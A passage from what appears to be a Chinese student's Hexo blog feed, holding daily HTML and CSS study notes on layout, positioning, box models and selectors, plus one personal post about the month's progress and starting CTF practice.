title="圆角边框(放在style里)"></a>圆角边框(放在style里)</h3><p>同时设置四个角:<br>border-radius:10px;<br>1.从四个角往内截10px(可以使用百分比)<br>2.设置一个值，四个角一样<br>3.设置两个值，左上右下——&gt;左下右上<br>4.设置三个值，左上——&gt;左下右上——&gt;右下<br>5.设置四个值，左上开始顺时针</p><p>设置单个角:<br>boder-top-left-radius:10px;<br>boder-top-right-radius:10px;<br>boder-bottom-left-radius:10px;<br>boder-bottom-right-radius:10px;</p><p>border-radius:10px/20px;<br>水平/垂直切割，只支持boder-radius</p><h3 id="字体引入"><a href="#字体引入" class="headerlink" title="字体引入"></a>字体引入</h3><pre><code>&lt;style&gt;    @font-family:kerwin;                   #字体名字    src:url(font/STHUPO.TTF);              #字体文件路径    div&#123;        font-family:kerwin;                #字体名字        font-size:50px;               color:red;        text-shadow:5px 0px 0px green;    &#125;&lt;/style&gt;</code></pre><h3 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h3><h4 id="怪异盒模型"><a href="#怪异盒模型" class="headerlink" title="怪异盒模型"></a>怪异盒模型</h4><p>box-sizing: content-box;      #普通盒模型，增加padding时会扩张box<br>box-sizing: border-box;       #怪异盒模型，增加时不会撑大</p><h4 id="弹性盒模型-能够适应页面"><a href="#弹性盒模型-能够适应页面" class="headerlink" title="弹性盒模型(能够适应页面)"></a>弹性盒模型(能够适应页面)</h4><p>display:flex;<br>1.默认横向排列，不是浮动。<br>2.行内元素变为块级元素。<br>3.margin:auto;自动居中<br>4.flex-direction: column;<br>5.column主轴列向排列，row纵向排列;column-reverse；纵向倒序排列，row-reverse横向倒序排列<br>6.justify-content:flex-end;主轴位置<br>align-items:center;侧轴位置<br>7.flex-start靠左对齐;flex-end靠右对齐;center靠中对齐;space-around环绕;space-between两端对齐</p><h4 id="折行与行间距"><a href="#折行与行间距" class="headerlink" title="折行与行间距"></a>折行与行间距</h4><p>flex-wrap:wrap;                #打开折行<br>align-content:flex-start;      #折行之后的行间距<br>flex-start,flex-end,center,space-around,space-between同上</p><h2 id="至此，HTML与CSS结束！"><a href="#至此，HTML与CSS结束！" class="headerlink" title="至此，HTML与CSS结束！"></a>至此，HTML与CSS结束！</h2><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句:"></a>每日一句:</h5><p>&nbsp;&nbsp;每一个问题都想给出回答，也有一些想说的，想劝的，想帮的，但想到自己的生活也是一地鸡毛。<br>「我们每个人都把自己活得一团糟，却总以为可以指导别人过得更好。」<br>&nbsp;&nbsp;但说回来还是一句用烦了的话，提升自己是解决一切问题的方式，亲情爱情友情都是，在现在这个世界里，经济独立财富自由能解决百分之九十的烦恼，很现实也很真实，我文化不高总觉得词不达意，慢慢来捱过去总会越来越好的，到达谷底的人怎么走都是向上的</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恍然大悟的一天</title>
      <link href="/2022/10/31/b-13/"/>
      <url>/2022/10/31/b-13/</url>
      
        <content type="html"><![CDATA[<p>好久没更新了<br>不是不想写，而是真的没时间写。<br>因为大学牲……</p><p>——————————卑微的分割线——————————</p><p>首先简述一下过去一个月的收获<br>1.当然是搭建了这个HexoBlog啦！！！虽然有人吐槽简陋而且没有服务器，但是这终归是我自己搭建的我所喜欢的博客。<br>  所以，请不要随意评论我的Blog哦~~<br>2.简简单单地学习了HTML和CSS，大概能够手搓一个非常非常简单的前端页面了<br>3.入门了CTF，这也是我这一个月所有忙活的目标。<br>  在这一个月里，经过无数次的磕磕碰碰，付出了无数的精力后，从一个完完全全的小白蜕变成了能够自己觅食寻找出路的初学者<br>4.参加了各种各样的社团面试和活动，每天都安排得满满的真的很累</p><p>然后再说一下未来的目标<br>1.肯定是继续学习前端JS还有后端PHP<br>2.写题啥的先放一下，因为靠写题来学习知识效率太低了<br>3.努力学好高数和线代……(希望)<br>4希望能够加入方班预备班？？？不是，咋我刚写下来就发通知通过了？？？</p><p>最后唠嗑两句<br>想结果的花，都早早低头;时人不识凌云木，直待凌云始道高。</p><p>—————————还是卑微的分割线—————————</p><p>附:<br>欢迎来看看我的<a href="https://gitmind.cn/app/doc/48spll2fph">笔记</a> ——&gt; 问题很多所以就看个乐子，保质期一个月<br><em><strong>嗯，没错，已经失效了</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML&amp;CSS拓展（5）</title>
      <link href="/2022/10/20/b-12/"/>
      <url>/2022/10/20/b-12/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h3><p>用a链接跳转到不同区域</p><pre><code>&lt;a href=&quot;#lianjie&quot;&gt;内容&lt;/a&gt;&lt;div id=&quot;a&quot;&gt;    内容&lt;/div&gt;点击a链接时跳到div中去</code></pre><h3 id="精灵图-图片整合技术"><a href="#精灵图-图片整合技术" class="headerlink" title="精灵图(图片整合技术)"></a>精灵图(图片整合技术)</h3><p>1.先将所有图片和为一个图<br>2.使用background-position来移动位置显示出</p><h3 id="宽高自适应"><a href="#宽高自适应" class="headerlink" title="宽高自适应"></a>宽高自适应</h3><p>定义:元素自动调整大小<br>1.定义宽高时为auto，元素的量决定宽高<br>2.min-height:10px;最小10px，多于10px就变大<br>问题:父元素不写高度时，子元素写了浮动，父元素会高度塌陷<br>1.声明<br>overflow:hidden;<br>2.浮动元素下加块元素并声明<br>clear:both; height:0; overflow:hidden;<br>3.清除浮动<br>after{content:””,clear:both; display:block; height:0; visibility:hidden;/overflow:hidden;}</p><h3 id="伪元素"><a href="#伪元素" class="headerlink" title="伪元素"></a>伪元素</h3><pre><code>div::first-letter&#123;          #定义第一个字符的样式    font-size:30px;    color:red;&#125;div::first-line&#123;&#125;           #定义第一行的样式div::after&#123;content:内容&#125;    #放在对象后的内容div::before&#123;content:内容&#125;   #放在对象前的内容</code></pre><h3 id="注意-隐藏的区别"><a href="#注意-隐藏的区别" class="headerlink" title="注意(隐藏的区别)"></a>注意(隐藏的区别)</h3><p>display:none(不占位)<br>visibility:hidden(占位)</p><h3 id="窗口自适应"><a href="#窗口自适应" class="headerlink" title="窗口自适应"></a>窗口自适应</h3><pre><code>1.单一栏目html,body&#123;    height:100%;             #所有盒子根据窗口的大小变化&#125;2.两栏布局(A)使用盒子的外边距&lt;style&gt;    .box1&#123;        height:100%;        ...        margin-left:200px;     #使一个盒子空出空间(外边距)    &#125;    .box2&#123;        height:100%;        ...        float:left;            #另一个盒子往另一边靠    &#125;&lt;/style&gt;(B)使用clac()函数计算长度值注意:可以使用加减乘除，而且运算符号前后都要加一个空格&lt;style&gt;    .box1&#123;        height:100%;        width:clac(100% - 200px);     #根据屏幕窗口的变化而改变        float:left;     &#125;    .box2&#123;        height:100%;        width:100px;         float:left;     &#125;&lt;/style&gt;3.三栏布局(A)1.先html,body&#123;&#125;全部统一变化2.left和right浮动3.center设置左右外边距4.先让左右浮动再插入center(B)同上，要在center加入clac函数</code></pre><h5 id="表单进阶"><a href="#表单进阶" class="headerlink" title="表单进阶"></a>表单进阶</h5><h3 id="单选框"><a href="#单选框" class="headerlink" title="单选框"></a>单选框</h3><pre><code>&lt;body&gt;    &lt;div&gt;性别&lt;/div&gt;                                        #定义标题    &lt;div&gt;        &lt;input type=&quot;radio&quot; name=&quot;1&quot; id=&quot;man&quot;&gt;            #radio是选框样式，name是一个组，id表示标记        &lt;label for=&quot;man&quot;&gt;男&lt;/label&gt;                       #label是说明标签，for是定位到上面的id    &lt;/div&gt;    &lt;div&gt;        &lt;input type=&quot;radio&quot; name=&quot;1&quot; id=&quot;woman&quot;&gt;        &lt;label for=&quot;woman&quot;&gt;女&lt;/label&gt;    &lt;/div&gt;&lt;/body&gt;注意:1.如果没有定义name(组)会变成多选2.如果要默认选中，在input中加上checked=&quot;checked&quot;，也可以直接写checked</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>人不该惧怕孤独，因为出生前，造物主就用孤独考验过每个人，哪里还能比在胚胎中更孤独呢？</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML&amp;CSS拓展（4）</title>
      <link href="/2022/10/19/b-11/"/>
      <url>/2022/10/19/b-11/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h3><pre><code>1.默认值position:static;2.绝对定位position:absolute;top:100px;left:-20px;脱离原始位置,但是原始位置占位，参照物是父元素或浏览器第一屏(没有父元素时)注:通常与相对定位相结合使用3.相对定位position:relative;top:100px;left:-20px;不脱离原始位置，但是原始位置不占位(类似于浮动),相对于原始位置4.固定定位position:fixed;top:100px;left:-20px;脱离原始位置，固定在浏览器窗口5.粘性定位position:sticky;top:0px;吸顶效果，需要定义距离边框的距离，css3.0新增附加:透明度&lt;style&gt;    p&#123;        opacity:0;        #0是完全透明，1是不透明    &#125;&lt;/style&gt;</code></pre><h3 id="三角形模型"><a href="#三角形模型" class="headerlink" title="三角形模型"></a>三角形模型</h3><pre><code>.box&#123;                                          #标准style    width:0px;                                 #定义盒子模型基本属性    height:0px;    border:20px solid transparent;             #四周全部透明    border-bottom:20px solid red;              #单边不透明，重合部分五五分显示颜色，这样子可以显示为三角形    position:relative;                         #相对盒子模型定位    bottom:2.5px;                              #移动至中间(美观)&#125;.box:hover span&#123;                               #悬浮时的style    width:0px;    height:0px;    border:20px solid transparent;    border-top:20px solid red;    position:relative;    top:2.5px;&#125;</code></pre><h3 id="定位的层级"><a href="#定位的层级" class="headerlink" title="定位的层级"></a>定位的层级</h3><p>父子关系时<br>z-index越大越靠上显示</p><h3 id="绝对定位深入探索"><a href="#绝对定位深入探索" class="headerlink" title="绝对定位深入探索"></a>绝对定位深入探索</h3><p>1.<br>兄弟关系时，后来者居上，后面的再上层<br>2.<br>行内元素转化为块元素<br>绝对定位法:定义absolute</p><pre><code>    &lt;style&gt;        span&#123;            width:            ...            poosition:absolute;        &#125;    &lt;/style&gt;&lt;body&gt;    &lt;span&gt;        内容    &lt;/span&gt;&lt;/body&gt;直接转化法:display:block;浮动法:float:left;</code></pre><h3 id="水平垂直居中"><a href="#水平垂直居中" class="headerlink" title="水平垂直居中"></a>水平垂直居中</h3><p>1.先定义absolute<br>2.设定宽高位置50%<br>3.移动-px至中间<br>4.注意是相对于哪个盒子</p><h3 id="定位与浮动的区别"><a href="#定位与浮动的区别" class="headerlink" title="定位与浮动的区别"></a>定位与浮动的区别</h3><p>有文字时:<br>浮动半脱离(文字环绕效果)<br>abslote全脱离(无环绕效果)</p><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>想结果的花， 都早早低头。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML&amp;CSS拓展（3）</title>
      <link href="/2022/10/18/b-10/"/>
      <url>/2022/10/18/b-10/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="溢出属性"><a href="#溢出属性" class="headerlink" title="溢出属性"></a>溢出属性</h3><p>overflow:visible全部显示,hidden不显示溢出的,scroll滑动一直存在,auto自动<br>overflow:inherit继承父元素的效果<br>单一方向显示<br>overflow-x:auto;<br>overflow-y:hidden;<br>一定要定义x和y</p><h3 id="空余空间"><a href="#空余空间" class="headerlink" title="空余空间"></a>空余空间</h3><pre><code>white-space:normal;        #normal无视空白，nowrap不换行直到br标签，pre，pre-wrap,pre-linepre标签是预格式化文本，保留空格tab回车pre保留空白，pre-wrap折行但是保留空白，pre-line保留空白不换行</code></pre><h3 id="溢出省略号"><a href="#溢出省略号" class="headerlink" title="溢出省略号"></a>溢出省略号</h3><pre><code>width:2000px;                     #一定要定义宽度white-space:nowrap;               #不换行overflow:hidden;                  #隐藏溢出的部分text-overflow:ellipsis;           #若溢出则在最后显示省略号</code></pre><h3 id="元素显示类型"><a href="#元素显示类型" class="headerlink" title="元素显示类型"></a>元素显示类型</h3><p>1.块元素(display:block或list-item)<br>例:p,div,h标签<br>A）块状元素在网页中就是以块的形式显示，快状就是元素显示为矩形区域，<br>B）默认情况下，块状元素都会占据一行，会按顺序自上而下排列。<br>C）块状元素都可以定义自己的宽度和高度<br>D）块状元素一般都作为其他元素的容器，它可以容纳其它内联元素和其它块状元素。<br>E）p标签只能放文本不能放块级元素（div等）<br>2.行内(内联)元素(display:inline)<br>例:a,b,em,i,span,strong标签<br>A）在同一行排列<br>B）无法设置宽高，只能默认<br>3.行内块元素(display:inline-block)<br>例:img,input标签<br>A）可以设置宽高<br>B）同行排列</p><p>注意<br>span行内元素只支持左右边距，不支持上下边距<br>行内块支持</p><h3 id="元素类型相互转换"><a href="#元素类型相互转换" class="headerlink" title="元素类型相互转换"></a>元素类型相互转换</h3><p>直接在style里display:block;进行转换</p><h3 id="设置鼠标悬浮时显示，否则隐藏"><a href="#设置鼠标悬浮时显示，否则隐藏" class="headerlink" title="设置鼠标悬浮时显示，否则隐藏"></a>设置鼠标悬浮时显示，否则隐藏</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        .hide&#123;                      #隐藏界面(不显示内容)            display:none;        &#125;        .box:hover ul&#123;              #在hover时显示块元素(block是原本的style)            display:block;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;hide&quot;&gt;        111111111111    &lt;/div&gt;    &lt;div class=&quot;box&quot;&gt;        内容1        &lt;ul class=&quot;hide&quot;&gt;            &lt;li&gt;11111&lt;/li&gt;            &lt;li&gt;22222&lt;/li&gt;            &lt;li&gt;33333&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="二级菜单案例《重点》"><a href="#二级菜单案例《重点》" class="headerlink" title="二级菜单案例《重点》"></a>二级菜单案例《重点》</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        *&#123;            padding:0;                       #先对整个页面布局            margin:0;        &#125;        .box&#123;            width:300px;            margin:0 auto;        &#125;        ul&#123;                                  #不悬浮时不显示            list-style:none;        &#125;        .box .item&#123;            float:left;            width:148px;                     #前面提到的要减去boder的宽度，因为计算的是加上boder的            text-align:center;            border:1px solid blue;            background:blue;            color:white;            line-height:40px;        &#125;        .item:hover&#123;            color:lightblue;        &#125;        .item&gt;ul&#123;                            # &gt;是选择器，选择子代的而不会选择到父代的ul标签            display:none;            background:white;            color:black;        &#125;        .item:hover ul&#123;                      #hover时恢复原本的块元素属性            display:block;        &#125;        .item li:hover&#123;                      #注意是hover在谁的时候显示变化            color:blue;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul class=&quot;box&quot;&gt;        &lt;li class=&quot;item&quot;&gt;aaaaaaaaaaaa        #第一个一级菜单            &lt;ul&gt;                &lt;li&gt;111&lt;/li&gt;                &lt;li&gt;222&lt;/li&gt;                 #第一个二级菜单                &lt;li&gt;333&lt;/li&gt;                &lt;li&gt;444&lt;/li&gt;            &lt;/ul&gt;        &lt;/li&gt;        &lt;li class=&quot;item&quot;&gt;bbbbbbbbbbbb        #第二个一级菜单            &lt;ul&gt;                &lt;li&gt;pmp&lt;/li&gt;                &lt;li&gt;红帽&lt;/li&gt;                #第二个二级菜单            &lt;/ul&gt;        &lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h5 id="每日一悟"><a href="#每日一悟" class="headerlink" title="每日一悟"></a>每日一悟</h5><p>1.有几个模块就方济各div标签(header，导航nav，list，footer)<br>2.一定要注意减去宽度<br>3.共同的属性发放在一起成为标签，如宽度<br>4.为了美观和简单布局，建议引入css文件</p><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>迷路，并无小路大路短路长路之区别。不能说在大路长路上迷路就不是迷路了。走在达不到目的的路上，就是迷路。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML&amp;CSS拓展（2）</title>
      <link href="/2022/10/16/b-9/"/>
      <url>/2022/10/16/b-9/</url>
      
        <content type="html"><![CDATA[<h6 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h6><h3 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h3><pre><code>1.外边距    &lt;style&gt;        div&#123;            padding:30px;               /* 一个值4个方向一样，两个值上下和左右，三个值上和左右和下，四个值上右下左 */            padding-left:0px;           /* 对单一方向更改 */        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;        111111111111111111    &lt;/div&gt;&lt;/body&gt;注意:1.上下两个box时外边距取大值2.左右两个box加和3.有父子两个box时，子盒子加外边距会整体移动解决:1.加浮动  2.overflow:hidden.2.边框&lt;style&gt;    .box1&#123;        border-top:10px dotted red;             #solid实线double双实线dashed虚线dotted点状线，可以选择单一方向更改        margin:10px auto;                       #用法同上，左边是纵向，右边是横向，auto是居中    &#125;&lt;/style&gt;注意:实际上的编写会有3px的误差，来源于图片标签的图片和文字间类型不同，需要转换:img&#123;    display:block;&#125;</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>迷路，并无小路大路短路长路之区别。不能说在大路长路上迷路就不是迷路了。走在达不到目的的路上，就是迷路。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML&amp;CSS拓展（1）</title>
      <link href="/2022/10/14/b-8/"/>
      <url>/2022/10/14/b-8/</url>
      
        <content type="html"><![CDATA[<h6 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h6><h3 id="列表属性-在列表前加元素"><a href="#列表属性-在列表前加元素" class="headerlink" title="列表属性(在列表前加元素)"></a>列表属性(在列表前加元素)</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;ul&#123;        list-style-type:none;                    /* disc实心圆 circle空心圆 square实心正方形 none无 */        list-style-image:url(地址);              /* 这样子是全部都使用这种style的，否则要在li前加class */        list-style-position: outside;            /* outside把上面的元素放在盒子外面，inside放在里面 */        &#125;        .p1&#123;            list-style:none url(地址) inside;    /* 复合属性写法 */        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul&gt;        &lt;li class=&quot;p1&quot;&gt;            内容        &lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="背景属性"><a href="#背景属性" class="headerlink" title="背景属性"></a>背景属性</h3><p>用法和字体颜色一样</p><pre><code>在style下对标签定义width,height,background-color:rgba(255,0,0,0.5)    #rgba是透明对于插入的图片:background-image: url(地址);                                     #默认平铺，图片太大裁剪，太小复制background-repeat: repeat;                                       #repeat默认，repeat-x是x轴平铺，repeat-y是y轴平铺，no-repeat不平铺background-position:10px 10%;                                    #图片放置的位置，左边是横向右边是纵向，%是相对于盒子的background-position:right center;                                #左边是横向右边是纵向background-size:400px 100%;                                      #左边是横向右边是纵向(会失真)，cover(完全覆盖但是可能无法全部显示)，contain(图片全部展示但是会留白)background-attachment: fixed;                                    #fixed固定在浏览器视窗内，scroll滚动，如果没有div会不显示复合写法background:   ;不看顺序注意:background-size要单独放</code></pre><h3 id="浮动属性"><a href="#浮动属性" class="headerlink" title="浮动属性"></a>浮动属性</h3><pre><code>float:left;         #并排靠左排列，太多换行float:right;        #和左对称浮动的会覆盖未浮动的(因为float的没有高度)文字不能被挡住，放在上层防止高度塌陷(防止覆盖)1.div内固定高度，令其有高度2.清浮动clear:left/right/both/none3.当前浮动元素后补一个盒子，不设置宽高，clear:both4.overflow:hidden;(使浮动元素计算高度)</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>人，归根结底，是一个物质存在，很容易受损伤，却不容易修复。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS基础（2）</title>
      <link href="/2022/10/12/b-7/"/>
      <url>/2022/10/12/b-7/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h3><pre><code>font-size        字体大小     单位是px，浏览器默认是16px,设计图常用字号是12pxfont-family      字体         当字体是中文字体、英文字体中有空格时，需加双引号                               多个字体中间用逗号链接,先解析第1个字体,如果没有解析第2个字体，以此类推 color            颜色         color:red;color:#ff0；color:rgb(255,0,0)；0-255 font-weight      加粗         font-weight:bolder(更粗的)/bold（加粗）/normal（常规）                               font-weight:100-900；100-500不加粗 600-900加粗 font-style       倾斜         font-style:italic(斜体字)/oblique(oblique倾斜的文字)/normal（常规显示）；text-align       文本水平对齐  text-align: left;       水平靠左                              text-align：right;     水平靠右                               text-align：cente;     水平居中                               text-align: justify;    水平2端对齐，但是只对多行起作用text-transform   单词大小写    uppercase全部大写,lowercase全部小写,none无定义,capitalize首字母大写样例&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        .p1&#123;            font-size:13px;        &#125;        .p2&#123;            font-family:宋体,等等等;    #逗号间隔，从左到右依次使用        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;p class=&quot;p1 p2&quot;&gt;        内容    &lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>字体总结:<br>宋体 SimSun<br>黑体 SimHei<br>微软雅黑 Microsoft YaHei<br>微软正黑体 Microsoft JhengHei<br>新宋体 NSimSun<br>新细明体 PMingLiU<br>细明体 MingLiU<br>标楷体 DFKai-SB<br>仿宋 FangSong<br>楷体 KaiTi<br>仿宋 _GB2312 FangSong_GB2312<br>楷体 _GB2312 KaiTi_GB2312</p><h3 id="字体颜色"><a href="#字体颜色" class="headerlink" title="字体颜色"></a>字体颜色</h3><p>1.<br>color:rgb(255,0,0)<br>0最弱255最强<br>2.<br>十六进制0<del>9，A</del>F<br>color:ffffff    #每两个对应上面的一组，0是最弱f是最强，相同的可以只写一次</p><h3 id="文本修饰"><a href="#文本修饰" class="headerlink" title="文本修饰"></a>文本修饰</h3><pre><code>line-height          行高        line-height的数据=height的数据，可以实现单行文本垂直居中 text-indent          首行缩进    text-indent可以取负值； text-indent属性只对第一行起作用 letter-spacing       字间距      控制文字和文字之间的间距 text-decoration      文本修饰    text-decoration:  none没有/underline下划线/overline上划线/line-through删除线 font                 文字简写    font是font-style  font-weight font-size/line-height font-family的简写。                                 font:italic 800 30px/80px&quot;宋体”;   注意！！！对于font————顺序不能改变,必须同时指定font-size和font-family属性时才起作用</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>问什么有时候比答什么更能表露说话人的心。————张北海</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS基础（1）</title>
      <link href="/2022/10/09/b-6/"/>
      <url>/2022/10/09/b-6/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><p>1.含义:如何修饰网页信息的显示样式<br>2.语法<br> 1）每个CSS样式由两部分组成，即选择符和声明，声明又分为属性和属性值。<br> 2）属性必须放在花括号中，属性与属性值用冒号连接。<br> 3）每条声明用分号结束。<br> 4）当一个属性有多个属性值的时候，属性值与属性值不分先后顺序，用空格隔开。<br> 5）在书写样式过程中，空格、换行等</p><h2 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h2><pre><code>第一&lt;style&gt;    h1&#123;color:red;&#125;&lt;/style&gt;放head和body都可以第二&lt;body&gt;    &lt;h1 style=&quot;color:red;&quot; &gt;内容&lt;/h1&gt;&lt;/body&gt;</code></pre><h2 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h2><pre><code>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; herf=&quot;css文件所在的地址&quot;&gt;       #注意是rel&lt;style&gt;    @import url(css文件所在的地址);                                    #注意分号&lt;style&gt;两种，最好放head标签里</code></pre><h2 id="扩展知识点"><a href="#扩展知识点" class="headerlink" title="扩展知识点"></a>扩展知识点</h2><p>link和import之间的区别？<br>①差别1：本质的差别：link属于XHTML标签，而@import完全是CSS提供的一种方式。<br>②差别2：加载顺序的差别：link引用的CSS会同时被加载，而@import引用的CSS会等到页面全部被下载完再被加载。所以有时候浏览@import加载 CSS的页面时开始会没有样式（就是闪烁），网速慢的时候还挺明显。<br>③差别3：兼容性的差别：@import老的浏览器不支持，而link标签无此问题。<br>样式表优先级<br>原则:就近原则————!important（放在属性值后）&gt;行内&gt;内部&gt;外部           #注意感叹号</p><h3 id="标签选择器"><a href="#标签选择器" class="headerlink" title="标签选择器"></a>标签选择器</h3><p>1.class类选择器</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        .类名1&#123;background-color:blue;&#125;                              #就近原则，离开头最近的style为准        .类名2&#123;background-color:red;&#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;类名1 类名2&quot;&gt;222&lt;/div&gt;                              #空格可以放置多个类名&lt;/body&gt;&lt;/html&gt;</code></pre><p>2.id选择器</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        #box1&#123;background-color:yellow;&#125;        #box3&#123;background-color:blue;&#125;        #box2&#123;background-color:red;&#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;1111111111&lt;/div&gt;    &lt;div id=&quot;box1&quot;&gt;2222222222&lt;/div&gt;    &lt;div id=&quot;box2&quot;&gt;3333333333&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;语法：#id名&#123;属性：属性值;&#125; A）使用id选择符时，应该为每个元素定义一个id属性 如：&lt;divid=&quot;box&quot;&gt;&lt;/div&gt; B）id选择符的语法格式是“#”加上自定义的id名 如：#box&#123;width:300px;height:300px;&#125; C）起名时要取英文名，不能用关键字：（所有的标记和属性都是关键字） 如：head标记 D）一个id名称只能对应文档中一个具体的元素对象,多个时就不显示样式。（唯一性）</code></pre><p>3.通配符选择器</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, 